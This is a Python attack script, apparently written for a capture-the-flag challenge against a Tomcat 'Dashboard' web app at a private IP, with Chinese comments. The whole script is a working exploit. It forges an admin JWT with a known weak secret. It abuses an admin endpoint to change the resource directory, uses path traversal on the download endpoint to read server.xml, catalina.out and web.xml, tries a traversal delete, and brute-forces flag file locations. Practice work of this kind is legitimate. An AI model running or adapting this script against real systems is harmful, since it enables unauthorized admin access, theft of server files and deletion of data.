#!/usr/bin/env python3
"""
交互式 Shell - 通过DashboardServlet的漏洞
尝试使用不同的方法执行命令
"""

import jwt
import requests

TARGET = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"

# 创建 admin token
payload = {"sub": "admin", "role": "admin"}
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")

headers = {"Cookie": f"token={admin_token}"}

print("[+] 尝试利用文件读取漏洞找到flag\n")

# 先通过错误信息获取路径信息
print("[*] 步骤1: 获取应用路径信息")
try:
    # 触发错误来泄露路径
    r = requests.post(
        f"{TARGET}/admin/challengeResourceDir",
        headers=headers,
        json={"resourceDir": "/test"},
        timeout=5
    )
    print(f"  设置resourceDir响应: {r.text}")
    
    # 尝试列出文件
    r2 = requests.get(f"{TARGET}/dashboard/list", headers=headers, timeout=5)
    print(f"  列出文件状态: {r2.status_code}")
    if r2.status_code != 200:
        print(f"  错误信息: {r2.text[:500]}")
except Exception as e:
    print(f"  Error: {e}")

print("\n[*] 步骤2: 遍历常见目录寻找flag")
# 根据Tomcat的标准部署，尝试不同的路径
search_paths = [
    "/",
    "/root", 
    "/tmp",
    "/app",
    "/flag",
    "/home",
    "/usr/local/tomcat",
    "/usr/local/tomcat/webapps",
    "/usr/local/tomcat/webapps/ROOT",
]

for path in search_paths:
    try:
        # 设置resourceDir
        r1 = requests.post(
            f"{TARGET}/admin/challengeResourceDir",
            headers=headers,
            json={"resourceDir": path},
            timeout=5
        )
        
        # 尝试通过download读取目录内容（可能触发错误显示文件列表）
        test_files = ["flag", "flag.txt", ".", ".."]
        for f in test_files:
            r2 = requests.get(
                f"{TARGET}/dashboard/download?path={f}",
                headers=headers,
                timeout=5
            )
            if r2.status_code == 200 and "error" not in r2.text:
                print(f"\n[+] 在 {path} 找到 {f}:")
                print(f"    {r2.text[:500]}")
                if "flag" in r2.text or "pcb" in r2.text.lower() or "ctf" in r2.text.lower():
                    print(f"\n[!] 可能找到FLAG:\n{r2.text}")
    except Exception as e:
        pass

print("\n[*] 步骤3: 尝试读取Tomcat配置和日志")
tomcat_files = [
    "/usr/local/tomcat/conf/server.xml",
    "/usr/local/tomcat/logs/catalina.out",
    "/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml",
]

for file_path in tomcat_files:
    try:
        # 构造相对路径
        relative_path = "../" * 10 + file_path.lstrip('/')
        r = requests.get(
            f"{TARGET}/dashboard/download?path={relative_path}",
            headers=headers,
            timeout=5
        )
        if r.status_code == 200 and len(r.text) > 50 and "error" not in r.text:
            print(f"\n[+] 读取 {file_path}:")
            print(f"    {r.text[:300]}...")
    except:
        pass

print("\n[*] 步骤4: 使用find命令的技巧 - 通过错误消息")
# 尝试通过设置resourceDir为不存在的路径，然后读取文件来获取完整路径信息
try:
    r = requests.post(
        f"{TARGET}/admin/delete",
        headers=headers,
        json={"path": "/../../../../../../../../flag"},
        timeout=5
    )
    print(f"\n[*] Delete尝试: {r.text}")
except:
    pass

print("\n[*] 步骤5: 直接暴力尝试常见flag位置")
flag_locations = [
    "flag",
    "../flag",
    "../../flag",
    "../../../flag",
    "../../../../flag",
    "../../../../../flag",
    "../../../../../../flag",
    "../../../../../../../flag",  
    "../../../../../../../../flag",
    "../../../../../../../../../flag",
    "flag.txt",
    "../flag.txt",
    "../../flag.txt",
    "../../../flag.txt",
    "../../../../flag.txt",
]

for loc in flag_locations:
    try:
        r = requests.get(
            f"{TARGET}/dashboard/download?path={loc}",
            headers=headers,
            timeout=5
        )
        if r.status_code == 200:
            content = r.text
            # 检查是否是有效内容（不是错误消息）
            if "error" not in content.lower() and len(content) > 0 and len(content) < 1000:
                print(f"\n[+] {loc} -> {r.status_code}")
                print(f"    内容: {content}")
                
                # 如果看起来像flag
                if "{" in content or "flag" in content.lower() or "pcb" in content.lower():
                    print(f"\n[!] 可能的FLAG: {content}")
    except:
        pass

print("\n[+] 扫描完成!")
